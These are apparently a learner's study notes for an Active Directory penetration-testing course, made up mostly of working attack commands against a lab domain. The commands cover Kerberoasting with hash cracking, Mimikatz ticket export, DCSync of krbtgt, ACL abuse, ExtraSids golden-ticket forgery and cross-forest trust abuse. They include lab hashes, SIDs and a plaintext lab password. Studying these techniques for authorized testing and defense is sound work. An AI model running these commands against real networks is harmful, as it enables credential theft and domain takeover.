## Kerberosting from Linux
## Kerberoasting with GetUserSPNs.py
Listing SPN Accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
Requesting all TGS Tickets
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
Requesting a Single TGS ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
Saving the TGS Ticket to an Output File
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Cracking the Ticket Offline with Hashcat
```
 hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

## Kerberoasting from Windows
### Manual method
#### Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```
Targeting a single user. These tickets will be loaded into memory and can be extracted by using mimikatz.
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
Retrieve all tickets using setspn.exe
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Extracting tickets from memory with Mimikatz
```
mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export
```
The base64 output can be taken and decoded to obtain the kirbi file. This kirbi file needs to be converted by using kirbi2john and hashcrack can be used to crack it.
```
echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
### Automated Tools - Powerview
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
```
for specific user
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
exporting all tickets to a CSV file
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### Rubeus
accounts with RC4 encryption are easy to crack
```
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
specific user
```
.\Rubeus.exe kerberoast /user:testspn /nowrap
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
```
 Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
hashcat code for aes
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
/tgtdeleg flag can be used to downgrade encryption to RC4. Only works on server 2016 and older.


![image](https://github.com/Kript0r3x/CPTS/assets/65650002/e8cf8acc-d7b1-4e10-8b70-d0d5f8003528)

ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
WriteOwner abused with Set-DomainObjectOwner
WriteDACL abused with Add-DomainObjectACL
AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
Addself abused with Add-DomainGroupMember

- ForceChangePassword - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
- GenericWrite - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
- AddSelf - shows security groups that a user can add themselves to.
- GenericAll - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the Local Administrator Password Solution (LAPS) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.

## Enumerating ACLs with PowerView
```
 Find-InterestingDomainAcl
```
```
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
### Performing a Reverse Search & Mapping to a GUID Value
```
$guid= "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl
```
### Using the -ResolveGUIDs Flag
```
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
### Creating a List of Domain Users
```
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
```
### A useful for loop
```
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```
keep on enumerate the rights and depending on it look for the domain groups, nested groups and their permissions
### finding the nested group
```
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
```

ACLs can also be enumerated easily by using bloodhoud. Look for **outbound control rights** it will give us lot of information.




## Domain trust
- Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
- Cross-link: A trust between child domains to speed up authentication.
- External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering or filters out authentication requests (by SID) not from the trusted domain.
- Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
- Forest: A transitive trust between two forest root domains.
- ESAE: A bastion forest used to manage Active Directory.

Trusts can be transitive or non-transitive.

- A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
- In a non-transitive trust, the child domain itself is the only one trusted.
  
Trusts can be set up in two directions: one-way or two-way (bidirectional).

- One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
- Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.
![image](https://github.com/Kript0r3x/CPTS/assets/65650002/200608da-c0f2-4394-bd12-206e8458d7a8)
### Enumerating Trust Relationships
```
Import-Module activedirectory
Get-ADTrust -Filter *
```
### Checking for Existing Trust using Get-DomainTrust
```
Get-DomainTrust
```
### Using Get-DomainTrustMapping
```
Get-DomainTrustMapping
```

### Checking Users in the Child Domain using Get-DomainUser
```
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```
### Using netdom to query domain trust
```
netdom query /domain:inlanefreight.local trust
```
### Using netdom to query domain controllers
```
netdom query /domain:inlanefreight.local dc
```
### Using netdom to query workstations and servers
```
netdom query /domain:inlanefreight.local workstation
```


## Attacking Domain Trusts - Child -> Parent Trusts - from windows
### ExtraSids Attack - Mimikatz
To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

### Obtaining the KRBTGT Account's NT Hash using Mimikatz
```
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```
### Using Get-DomainSID
```
Get-DomainSID
```
### Obtaining Enterprise Admins Group's SID using Get-DomainGroup
```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
before starting the attack let's just confirm that we don't have accessot the file system of the DC in the parent domain
### Using ls to Confirm No Access
```
ls \\academy-ea-dc01.inlanefreight.local\c$
```
### Creating a Golden Ticket with Mimikatz
```
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
### Confirming a Kerberos Ticket is in Memory Using list
```
klist
```
## ExtraSids Attack - Rubeus
### Creating a Golden Ticket using Rubeus
```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
## Attacking Domain Trusts - Child -> Parent Trusts - from Linux
### Performing DCSync with secretsdump.py
```
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
### Performing SID Brute Forcing using lookupsid.py
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
grep the output to look for Domain SUID
Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs.
### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
```
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
### Constructing a Golden Ticket using ticketer.py
```
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```
The ticket will be saved down to our system as a credential cache (ccache) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
### Setting the KRB5CCNAME Environment Variable
```
export KRB5CCNAME=hacker.ccache
```
### Getting a SYSTEM shell using Impacket's psexec.py
```
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
*Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.*
### Performing the Attack with raiseChild.py
```
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
### Enumerating Accounts for Associated SPNs Using Get-DomainUser
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
### Enumerating the mssqlsvc Account
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
### Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```
### Admin Password Re-Use & Group Membership
We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership.
###  Using Get-DomainForeignGroupMember
```
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
```
verifying the access
Accessing DC03 Using Enter-PSSession
```
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
```
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
we can perform kerberoasting across a forest trust with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command.
```
GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
```
### Hunting Foreign Group Membership with Bloodhound-python
On some assessments, our client may provision a VM for us that gets an IP from DHCP and is configured to use the internal domain's DNS. We will be on an attack host without DNS configured in other instances. In this case, we would need to edit our resolv.conf file to run this tool(python Bloodhound on linux) since it requires a DNS hostname for the target Domain Controller instead of an IP address. We can edit the file as follows using sudo rights. Here we have commented out the current nameserver entries and added the domain name and the IP address of ACADEMY-EA-DC01 as the nameserver.
<img width="410" alt="image" src="https://github.com/Kript0r3x/CPTS/assets/65650002/15bc4f1d-eeee-4ffb-9800-f94f0eef56a3">
### Running bloodhound-python Against INLANEFREIGHT.LOCAL
```
bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2
```
repeat the same with the other forest.
